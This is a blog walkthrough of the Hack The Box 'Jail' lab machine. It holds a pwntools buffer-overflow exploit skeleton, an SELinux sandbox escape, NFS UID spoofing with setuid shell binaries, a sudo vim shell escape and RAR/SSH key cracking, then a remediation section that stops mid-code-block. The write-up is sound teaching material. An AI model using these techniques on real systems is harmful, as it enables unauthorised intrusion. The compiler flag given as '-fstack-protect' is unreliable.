<!doctype html><html lang=en><head><title>Jail HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Jail HTB machine featuring custom binary buffer overflow exploitation, NFS user ID spoofing, SELinux sandbox escape, SSH key cracking, and multiple privilege escalation techniques"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/jail-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Jail HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Jail HTB machine featuring custom binary buffer overflow exploitation, NFS user ID spoofing, SELinux sandbox escape, SSH key cracking, and multiple privilege escalation techniques"><meta property="og:url" content="https://malayamanas.github.io/posts/jail-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 11:00:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/jail-htb-walkthrough/>Jail HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/nmap/>nmap</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/gobuster/>gobuster</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/buffer-overflow/>buffer-overflow</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/nfs/>nfs</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/selinux-escape/>selinux-escape</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ssh-keys/>ssh-keys</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/sudo-misconfiguration/>sudo-misconfiguration</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/rar-cracking/>rar-cracking</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/source-code-analysis/>source-code-analysis</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/custom-binary/>custom-binary</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/32-bit/>32-bit</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/centos/>centos</a>&nbsp;</span><div class=post-content><div><h1 id=jail-htb---insane-linux-box-walkthrough>Jail HTB - Insane Linux Box Walkthrough<a href=#jail-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/80-73OYcrrk?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques>Key Exploitation Steps and Techniques<a href=#key-exploitation-steps-and-techniques class=hanchor arialabel=Anchor>#</a></h2><p>Below is a chronological extraction of the key exploitation steps and techniques used to compromise the &ldquo;Jail&rdquo; machine from Hack The Box, as described in the provided data. The process involves multiple stages, including initial enumeration, exploiting vulnerabilities, and privilege escalation.</p><h3 id=key-exploitation-steps-and-techniques-chronological-order>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order class=hanchor arialabel=Anchor>#</a></h3><h3 id=1-initial-network-enumeration-nmap-scans>1. Initial Network Enumeration (Nmap Scans)<a href=#1-initial-network-enumeration-nmap-scans class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Port scanning with Nmap to identify open ports and services.</li><li><strong>Steps</strong>:<ul><li>Perform an all-ports scan: <code>nmap -p- -oA allports [TARGET-IP]</code> to identify open ports.</li><li>Conduct a detailed scan on identified ports (22, 80, 111, 7411, 2048) with version detection and safe scripts: <code>nmap -sC -sV -oA basic_scripts -p 22,80,111,7411,2048 [TARGET-IP]</code>.</li></ul></li><li><strong>Findings</strong>:<ul><li>Port 80: Apache 2.4.6 (CentOS), indicating CentOS 7.</li><li>Port 111: NFS version 3, vulnerable to user ID spoofing.</li><li>Port 2048: Likely related to NFS (mountd).</li><li>Port 7411: Unknown service, later identified as a custom application.</li></ul></li></ul><h3 id=2-web-server-enumeration>2. Web Server Enumeration<a href=#2-web-server-enumeration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Manual web browsing and directory enumeration with Gobuster.</li><li><strong>Steps</strong>:<ul><li>Access the web server at <code>http://[TARGET-IP]</code>. No significant content found in the main page or <code>robots.txt</code>.</li><li>Run Gobuster to enumerate directories: <code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-insane.txt -u http://[TARGET-IP] -o gobuster.log -t 25</code>.</li></ul></li><li><strong>Findings</strong>:<ul><li>Discovered <code>/jailuser/dev/</code> directory containing three files: <code>compile.sh</code>, <code>jail</code> (binary), and <code>jail.c</code> (source code).</li></ul></li></ul><h3 id=3-source-code-analysis-jailc>3. Source Code Analysis (jail.c)<a href=#3-source-code-analysis-jailc class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Manual code review to identify vulnerabilities.</li><li><strong>Steps</strong>:<ul><li>Download files from <code>/jailuser/dev/</code> using <code>wget -r http://[TARGET-IP]/jailuser/dev/</code>.</li><li>Analyze <code>jail.c</code> source code, identifying:<ul><li>A buffer overflow vulnerability in <code>strcpy</code>, copying a 256-byte <code>password</code> buffer into a 16-byte <code>userpass</code> buffer.</li><li>Hard-coded credentials: username <code>admin</code>, password <code>1974jailbreak</code>.</li><li>Debug mode that leaks memory addresses when enabled.</li><li>The application listens on port 7411 for socket-based communication.</li></ul></li><li>Review <code>compile.sh</code>, noting flags <code>-m32</code> (32-bit binary) and <code>-z execstack</code> (disables stack protection).</li></ul></li></ul><h3 id=4-buffer-overflow-exploitation-setup>4. Buffer Overflow Exploitation Setup<a href=#4-buffer-overflow-exploitation-setup class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Setting up a local CentOS 7 environment to mimic the target for reliable exploit development.</li><li><strong>Steps</strong>:<ul><li>Set up a CentOS 7 box and transfer <code>jail.c</code> and <code>compile.sh</code>.</li><li>Modify <code>compile.sh</code> to include <code>-g</code> flag for debugging symbols: <code>gcc -m32 -z execstack -g jail.c -o jail</code>.</li><li>Run the binary and attach GDB: <code>ps aux | grep jail</code> to get PID, then <code>gdb --pid &lt;PID></code>.</li><li>Configure GDB: Set <code>follow-fork-mode</code> to <code>child</code> and <code>detach-on-fork</code> to <code>off</code> to track child processes.</li></ul></li></ul><h3 id=5-buffer-overflow-exploit-development>5. Buffer Overflow Exploit Development<a href=#5-buffer-overflow-exploit-development class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Crafting a buffer overflow exploit using Pwntools to gain a shell.</li><li><strong>Steps</strong>:<ul><li>Connect to the service on port 7411: <code>nc [LOCAL-IP] 7411</code>.</li><li>Enable debug mode: Send <code>debug</code>, <code>user admin</code>, and <code>pass &lt;payload></code>.</li><li>Identify the buffer overflow offset using a cyclic pattern (50 bytes) generated by <code>pwntools</code>: <code>pwn cyclic 50</code>.</li><li>Use GDB to find the offset (28 bytes) where EIP is overwritten: <code>pwn cyclic -l &lt;value></code>.</li><li>Leak the <code>userpass</code> buffer address in debug mode.</li><li>Craft exploit skeleton with Pwntools:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>context(os<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;linux&#39;</span>, arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;i386&#39;</span>)
</span></span><span style=display:flex><span>host, port <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;[TARGET-IP]&#39;</span>, <span style=color:#ae81ff>7411</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(host, port)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;OK Ready&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;OK Debug mode on&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;user admin&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;pass&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>28</span> <span style=color:#f92672>+</span> p32(<span style=color:#f92672>&lt;</span>leaked_address<span style=color:#f92672>&gt;</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xcc</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span></code></pre></div></li><li>Initially attempt a reverse TCP shellcode, but it fails due to iptables blocking reverse shells.</li></ul></li></ul><h3 id=6-socket-reuse-shellcode>6. Socket Reuse Shellcode<a href=#6-socket-reuse-shellcode class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Use socket reuse shellcode to bypass iptables restrictions.</li><li><strong>Steps</strong>:<ul><li>Replace reverse shellcode with socket reuse shellcode (smaller, reuses existing connection).</li><li>Modify exploit to include socket reuse shellcode and enter interactive mode: <code>p.interactive()</code>.</li><li>Execute exploit: <code>python exploit.py</code>, gaining a shell as <code>nobody</code> in an SELinux sandbox.</li></ul></li></ul><h3 id=7-selinux-sandbox-escape>7. SELinux Sandbox Escape<a href=#7-selinux-sandbox-escape class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Exploit a command injection vulnerability in SELinux (referenced CVE).</li><li><strong>Steps</strong>:<ul><li>Research SELinux escape techniques via Reddit (<code>site:reddit.com/r/netsec selinux escape</code>).</li><li>Identify a CVE exploiting terminal input buffer stuffing post-sandbox execution.</li><li>Compile and execute the SELinux bypass exploit:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gcc sebypass_id.c -o sebypass_id
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>4755</span> sebypass_id
</span></span><span style=display:flex><span>./sebypass_id
</span></span></code></pre></div></li><li>Gain a shell as user <code>frank</code> (effective UID 1000).</li></ul></li></ul><h3 id=8-nfs-user-id-spoofing>8. NFS User ID Spoofing<a href=#8-nfs-user-id-spoofing class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Exploit NFS version 3 user ID spoofing to create a setuid binary.</li><li><strong>Steps</strong>:<ul><li>Enumerate NFS shares: <code>showmount -e [TARGET-IP]</code>, revealing <code>/opt</code> and <code>/var/nfs_share</code>.</li><li>Mount NFS shares locally: <code>mount -t nfs -o vers=3 [TARGET-IP]:/opt /mnt/jail/opt</code> and <code>mount -t nfs -o vers=3 [TARGET-IP]:/var/nfs_share /mnt/jail/nfs_share</code>.</li><li>Modify local user UID to 1000 (matching <code>frank</code>): Edit <code>/etc/passwd</code> and <code>/etc/group</code>.</li><li>Create a setuid binary:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setuid</span>(<span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setgid</span>(<span style=color:#ae81ff>1000</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/usr/bin/id&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Compile: <code>gcc -o tip_id tip_id.c</code>, set permissions: <code>chmod 4755 tip_id</code>, and copy to <code>/var/nfs_share</code>.</li><li>Execute on the target to verify UID 1000 access.</li></ul></li></ul><h3 id=9-ssh-key-deployment>9. SSH Key Deployment<a href=#9-ssh-key-deployment class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Use NFS write access to deploy an SSH key for <code>frank</code>.</li><li><strong>Steps</strong>:<ul><li>Generate SSH key pair: <code>ssh-keygen -f ~/htb/boxes/jail/frank_key</code>.</li><li>Write the public key to <code>/var/nfs_share/.key</code> using the setuid binary.</li><li>Copy to <code>/home/frank/.ssh/authorized_keys</code> on the target.</li><li>SSH as <code>frank</code>: <code>ssh -i frank_key frank@[TARGET-IP]</code>.</li></ul></li></ul><h3 id=10-privilege-escalation-to-adm-user>10. Privilege Escalation to <code>adm</code> User<a href=#10-privilege-escalation-to-adm-user class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Exploit <code>sudo</code> misconfiguration allowing <code>frank</code> to run <code>vim</code> as <code>adm</code>.</li><li><strong>Steps</strong>:<ul><li>Check <code>sudo</code> privileges: <code>sudo -l</code>, revealing <code>frank</code> can run <code>vim /opt/logreader/logread.sh</code> as <code>adm</code>.</li><li>Run <code>sudo -u adm vim /opt/logreader/logread.sh</code>, enter <code>:python import pty; pty.spawn("/bin/bash")</code> to spawn a shell as <code>adm</code>.</li></ul></li></ul><h3 id=11-privilege-escalation-to-root>11. Privilege Escalation to <code>root</code><a href=#11-privilege-escalation-to-root class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Crack an encrypted RAR file and recover the root SSH key.</li><li><strong>Steps</strong>:<ul><li>Find encrypted file <code>/var/adm/keys.rar</code> and note in <code>/var/adm/note.txt</code>: Password format is <code>&lt;lastname>&lt;4digits>&lt;symbol></code>.</li><li>Identify <code>frank</code> as Frank Morris (from Alcatraz escape reference).</li><li>Generate a wordlist with Hashcat: <code>./hashcat --stdout -a 3 Morris19?d?d? -o /root/john.jail.words</code>.</li><li>Crack RAR password with John the Ripper: <code>john --wordlist=/root/john.jail.words /root/jail.hash</code>, revealing <code>Morris1962!</code>.</li><li>Extract <code>root_authorized_ssh_key.pub</code> from <code>keys.rar</code>.</li><li>Use <code>opt-ssh-ctf-tool</code> to derive the private key via the Wiener attack: <code>opt-ssh-ctf-tool --publickey root_authorized_ssh_key.pub --private --verbose</code>.</li><li>SSH as <code>root</code>: <code>ssh -i root_key root@[TARGET-IP]</code>.</li></ul></li></ul><h3 id=12-alternative-privilege-escalation-to-adm-unintended>12. Alternative Privilege Escalation to <code>adm</code> (Unintended)<a href=#12-alternative-privilege-escalation-to-adm-unintended class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Exploit NFS share permissions to create a setuid binary for <code>adm</code> (UID 3).</li><li><strong>Steps</strong>:<ul><li>Verify NFS share <code>/var/nfs_share</code> is mounted and writable by <code>frank</code> (UID 1000).</li><li>Create a directory with full permissions: <code>mkdir /var/nfs_share/ipsec; chmod 777 /var/nfs_share/ipsec</code>.</li><li>Change local user UID to 3 (matching <code>adm</code>): Edit <code>/etc/passwd</code> and <code>/etc/group</code>.</li><li>Create a setuid binary:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setuid</span>(<span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setgid</span>(<span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>execl</span>(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;bash&#34;</span>, NULL);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Compile: <code>gcc suid.c -o suid</code>, set permissions: <code>chmod 6755 suid</code>, and copy to <code>/var/nfs_share/ipsec</code>.</li><li>Execute on the target to gain a shell as <code>adm</code> (effective UID 3).</li><li>Use the setuid binary to append an SSH key to <code>/var/adm/.ssh/authorized_keys</code> non-destructively: <code>echo &lt;pubkey> | ./suid -a /var/adm/.ssh/authorized_keys</code>.</li></ul></li></ul><h3 id=summary-of-techniques>Summary of Techniques<a href=#summary-of-techniques class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Enumeration</strong>: Nmap, Gobuster, manual web browsing, <code>showmount</code>.</li><li><strong>Vulnerability Exploitation</strong>: Buffer overflow in <code>jail.c</code>, NFS user ID spoofing, SELinux command injection, <code>sudo</code> misconfiguration, RAR password cracking, RSA private key recovery.</li><li><strong>Key Tools</strong>: Nmap, Gobuster, GDB, Pwntools, John the Ripper, Hashcat, <code>opt-ssh-ctf-tool</code>, GCC.</li><li><strong>Privilege Escalation Path</strong>: <code>nobody</code> (via buffer overflow) → <code>frank</code> (via SELinux escape) → <code>adm</code> (via <code>sudo vim</code> or NFS setuid) → <code>root</code> (via RAR cracking and SSH key).</li></ul><p>This sequence reflects the chained exploits required to fully compromise the &ldquo;Jail&rdquo; machine, including both intended and unintended methods for privilege escalation.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Below is a detailed list of the vulnerabilities (gaps) identified in the services and systems of the &ldquo;Jail&rdquo; machine from Hack The Box, as described in the provided data. For each vulnerability, I will specify whether it can be fixed with a source code fix, a configuration fix, or both, along with recommended remediation steps. The vulnerabilities are organized by the affected service or system component.</p><h3 id=1-apache-web-server-port-80>1. Apache Web Server (Port 80)<a href=#1-apache-web-server-port-80 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability</strong>: Directory exposure of sensitive files</p><ul><li><strong>Description</strong>: The <code>/jailuser/dev/</code> directory is publicly accessible, exposing sensitive files (<code>jail.c</code>, <code>compile.sh</code>, <code>jail</code> binary), which allowed attackers to analyze source code and identify vulnerabilities.</li><li><strong>Fix Type</strong>: Configuration fix</li><li><strong>Remediation</strong>:<ul><li><strong>Restrict Directory Access</strong>: Configure Apache to deny access to sensitive directories. Add the following to the Apache configuration (<code>httpd.conf</code> or equivalent):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>&#34;/var/www/html/jailuser/dev&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    Order Deny,Allow
</span></span><span style=display:flex><span>    Deny from <span style=color:#66d9ef>all</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/Directory&gt;</span>
</span></span></code></pre></div></li><li><strong>Use Authentication</strong>: Protect sensitive directories with HTTP authentication:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>&#34;/var/www/html/jailuser/dev&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    AuthType Basic
</span></span><span style=display:flex><span>    AuthName <span style=color:#e6db74>&#34;Restricted Area&#34;</span>
</span></span><span style=display:flex><span>    AuthUserFile <span style=color:#e6db74>/etc/apache2/.htpasswd</span>
</span></span><span style=display:flex><span>    Require valid-user
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/Directory&gt;</span>
</span></span></code></pre></div></li><li><strong>Disable Directory Listing</strong>: Ensure <code>Options -Indexes</code> is set in the Apache configuration to prevent directory indexing:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>&#34;/var/www/html&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    Options -Indexes
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/Directory&gt;</span>
</span></span></code></pre></div></li><li><strong>Regular Audits</strong>: Periodically audit the web server for exposed files using tools like <code>find</code> or automated scanners to identify misconfigurations.</li></ul></li></ul><h3 id=2-custom-application-port-7411-jailc>2. Custom Application (Port 7411, jail.c)<a href=#2-custom-application-port-7411-jailc class=hanchor arialabel=Anchor>#</a></h3><p><strong>Vulnerability 1</strong>: Buffer overflow in <code>strcpy</code></p><ul><li><strong>Description</strong>: The <code>jail.c</code> application uses <code>strcpy</code> to copy a 256-byte <code>password</code> buffer into a 16-byte <code>userpass</code> buffer, leading to a stack-based buffer overflow that allows arbitrary code execution.</li><li><strong>Fix Type</strong>: Source code fix</li><li><strong>Remediation</strong>:<ul><li><strong>Use Safe String Functions</strong>: Replace <code>strcpy</code> with <code>strncpy</code> to limit the number of bytes copied:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>strncpy</span>(userpass, password, <span style=color:#66d9ef>sizeof</span>(userpass) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>userpass[<span style=color:#66d9ef>sizeof</span>(userpass) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>; <span style=color:#75715e>// Ensure null-termination
</span></span></span></code></pre></div></li><li><strong>Input Validation</strong>: Validate the length of user input before copying:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strlen</span>(password) <span style=color:#f92672>&gt;=</span> <span style=color:#66d9ef>sizeof</span>(userpass)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Password too long</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li><strong>Enable Stack Protection</strong>: Compile with stack-smashing protection (e.g., <code>-fstack-protect</code> in GCC) to detect and prevent buffer overflows:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gcc -m32 -fstack-protect jail.c -o jail
</span></span></code></pre></div></li></ul></li></ul><p><strong>Vulnerability 2</strong>: Hard-coded credentials</p><ul><li><strong>Description</strong>: The application uses hard-coded credentials (<code>admin</code>, <code>1974jailbreak</code>), allowing unauthorized access.</li><li><strong>Fix Type</strong>: Source code fix</li><li><strong>Remediation</strong>:<ul><li><strong>Remove Hard-Coded Credentials</strong>: Store credentials in a secure configuration file or database with proper access controls.</li><li><strong>Implement User Authentication</strong>: Use a proper authentication mechanism (e.g., PAM or a database-backed system) to validate credentials dynamically.</li><li><strong>Hash Passwords</strong>: If passwords must be stored, use a secure hashing algorithm (e.g., bcrypt) instead of plain text.</li></ul></li></ul><p><strong>Vulnerability 3</strong>: Debug mode leaks memory addresses</p><ul><li><strong>Description</strong>: Enabling debug mode prints the <code>userpass</code> buffer address, facilitating buffer overflow exploits by bypassing ASLR.</li><li><strong>Fix Type</strong>: Source code fix</li><li><strong>Remediation</strong>:<ul><li><strong>Remove Debug Mode</strong>: Eliminate the debug mode functionality or restrict it to authorized users (e.g., via environment variables or configuration flags).</li><li><strong>Sanitize Output</strong>: Avoid printing raw memory addresses. If debugging is necessary, use logging to a secure file accessible only to administrators:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> (debug_mode <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Log to secure file instead of stdout
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    FILE <span style=color:#f92672>*</span>log <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;/var/log/jail.log&#34;</span>, <span style=color:#e6db74>&#34;a&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (log) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fprintf</span>(log, <span style=color:#e6db74>&#34;Debug info</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fclose</span>(log);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li><strong>Enable ASLR</strong>: Ensure Address Space Layout Randomization (ASLR) is enabled system-wide (see system configuration below).</li></ul></li></ul><p><strong>Vulnerability 4</strong>: Executable stack</p><ul><li><strong>Description</strong>: The binary is compiled with <code>-z execstack</code>, making the stack executable and allowing shellcode execution.</li><li><strong>Fix Type</strong>: Configuration fix (compilation)</li><li><strong>Remediation</strong>:<ul><li><strong>Disable Executable Stack</strong>: Remove the <code>-z execstack</code> flag during compilation to enforce a non-executable stack:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gcc -m32 jail.c -o jail
